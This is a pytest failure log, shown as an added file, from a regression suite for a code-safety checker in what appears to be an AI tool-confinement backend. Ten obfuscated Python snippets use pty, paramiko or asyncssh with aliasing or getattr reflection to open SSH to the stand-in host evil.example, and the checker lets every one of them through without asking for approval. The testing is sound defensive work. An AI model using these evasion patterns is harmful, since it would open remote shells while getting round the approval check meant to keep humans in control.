@@ -1,0 +1,70 @@
+FFFFFFFFFF.                                                              [100%]
+=================================== FAILURES ===================================
+_ test_reflective_and_pty_ssh_requires_approval[import pty; pty.spawn(['ssh','-F','none','evil.example'])] _
+/evidence/round15_regressions.py:17: in test_reflective_and_pty_ssh_requires_approval
+    assert _check_code_safety(code,session_id='round15') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import pty; pty.spawn(['ssh','-F','none','evil.example'])", session_id='round15')
+_ test_reflective_and_pty_ssh_requires_approval[from pty import spawn as launch; launch(['ssh','-F','none','evil.example'])] _
+/evidence/round15_regressions.py:17: in test_reflective_and_pty_ssh_requires_approval
+    assert _check_code_safety(code,session_id='round15') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("from pty import spawn as launch; launch(['ssh','-F','none','evil.example'])", session_id='round15')
+_ test_reflective_and_pty_ssh_requires_approval[import pty as p; launch=p.spawn; launch(argv=['ssh','-F','none','evil.example'])] _
+/evidence/round15_regressions.py:17: in test_reflective_and_pty_ssh_requires_approval
+    assert _check_code_safety(code,session_id='round15') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import pty as p; launch=p.spawn; launch(argv=['ssh','-F','none','evil.example'])", session_id='round15')
+_ test_reflective_and_pty_ssh_requires_approval[import paramiko; getattr(paramiko,'SSHClient')().connect(hostname='evil.example')] _
+/evidence/round15_regressions.py:17: in test_reflective_and_pty_ssh_requires_approval
+    assert _check_code_safety(code,session_id='round15') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import paramiko; getattr(paramiko,'SSHClient')().connect(hostname='evil.example')", session_id='round15')
+_ test_reflective_and_pty_ssh_requires_approval[import paramiko; factory=getattr(paramiko,'SSHClient'); client=factory(); client.connect(hostname='evil.example')] _
+/evidence/round15_regressions.py:17: in test_reflective_and_pty_ssh_requires_approval
+    assert _check_code_safety(code,session_id='round15') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import paramiko; factory=getattr(paramiko,'SSHClient'); client=factory(); client.connect(hostname='evil.example')", session_id='round15')
+_ test_reflective_and_pty_ssh_requires_approval[import paramiko; client=paramiko.SSHClient(); getattr(client,'connect')(hostname='evil.example')] _
+/evidence/round15_regressions.py:17: in test_reflective_and_pty_ssh_requires_approval
+    assert _check_code_safety(code,session_id='round15') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import paramiko; client=paramiko.SSHClient(); getattr(client,'connect')(hostname='evil.example')", session_id='round15')
+_ test_reflective_and_pty_ssh_requires_approval[import paramiko; client=paramiko.SSHClient(); connect=getattr(client,'connect'); connect(hostname='evil.example')] _
+/evidence/round15_regressions.py:17: in test_reflective_and_pty_ssh_requires_approval
+    assert _check_code_safety(code,session_id='round15') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import paramiko; client=paramiko.SSHClient(); connect=getattr(client,'connect'); connect(hostname='evil.example')", session_id='round15')
+_ test_reflective_and_pty_ssh_requires_approval[import asyncssh; getattr(asyncssh,'connect')('evil.example',config=None)] _
+/evidence/round15_regressions.py:17: in test_reflective_and_pty_ssh_requires_approval
+    assert _check_code_safety(code,session_id='round15') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import asyncssh; getattr(asyncssh,'connect')('evil.example',config=None)", session_id='round15')
+_ test_dynamic_ssh_reflection_fails_closed[import paramiko; name='SSHClient'; getattr(paramiko,name)().connect(hostname='evil.example')] _
+/evidence/round15_regressions.py:27: in test_dynamic_ssh_reflection_fails_closed
+    assert _check_code_safety(code,session_id='round15') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import paramiko; name='SSHClient'; getattr(paramiko,name)().connect(hostname='evil.example')", session_id='round15')
+_ test_dynamic_ssh_reflection_fails_closed[import paramiko; client=paramiko.SSHClient(); name='connect'; getattr(client,name)(hostname='evil.example')] _
+/evidence/round15_regressions.py:27: in test_dynamic_ssh_reflection_fails_closed
+    assert _check_code_safety(code,session_id='round15') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import paramiko; client=paramiko.SSHClient(); name='connect'; getattr(client,name)(hostname='evil.example')", session_id='round15')
+=============================== warnings summary ===============================
+studio/backend/core/inference/tool_confinement.py:262
+  /work/studio/backend/core/inference/tool_confinement.py:262: DeprecationWarning: Due to '_pack_', the '_PathBeneathAttr' Structure will use memory layout compatible with MSVC (Windows). If this is intended, set _layout_ to 'ms'. The implicit default is deprecated and slated to become an error in Python 3.19.
+    class _PathBeneathAttr(ctypes.Structure):
+
+-- Docs: https://docs.pytest.org/en/stable/how-to/capture-warnings.html
+=========================== short test summary info ============================
+FAILED ../evidence/round15_regressions.py::test_reflective_and_pty_ssh_requires_approval[import pty; pty.spawn(['ssh','-F','none','evil.example'])]
+FAILED ../evidence/round15_regressions.py::test_reflective_and_pty_ssh_requires_approval[from pty import spawn as launch; launch(['ssh','-F','none','evil.example'])]
+FAILED ../evidence/round15_regressions.py::test_reflective_and_pty_ssh_requires_approval[import pty as p; launch=p.spawn; launch(argv=['ssh','-F','none','evil.example'])]
+FAILED ../evidence/round15_regressions.py::test_reflective_and_pty_ssh_requires_approval[import paramiko; getattr(paramiko,'SSHClient')().connect(hostname='evil.example')]
+FAILED ../evidence/round15_regressions.py::test_reflective_and_pty_ssh_requires_approval[import paramiko; factory=getattr(paramiko,'SSHClient'); client=factory(); client.connect(hostname='evil.example')]
+FAILED ../evidence/round15_regressions.py::test_reflective_and_pty_ssh_requires_approval[import paramiko; client=paramiko.SSHClient(); getattr(client,'connect')(hostname='evil.example')]
+FAILED ../evidence/round15_regressions.py::test_reflective_and_pty_ssh_requires_approval[import paramiko; client=paramiko.SSHClient(); connect=getattr(client,'connect'); connect(hostname='evil.example')]
+FAILED ../evidence/round15_regressions.py::test_reflective_and_pty_ssh_requires_approval[import asyncssh; getattr(asyncssh,'connect')('evil.example',config=None)]
+FAILED ../evidence/round15_regressions.py::test_dynamic_ssh_reflection_fails_closed[import paramiko; name='SSHClient'; getattr(paramiko,name)().connect(hostname='evil.example')]
+FAILED ../evidence/round15_regressions.py::test_dynamic_ssh_reflection_fails_closed[import paramiko; client=paramiko.SSHClient(); name='connect'; getattr(client,name)(hostname='evil.example')]
+10 failed, 1 passed, 1 warning in 0.22s
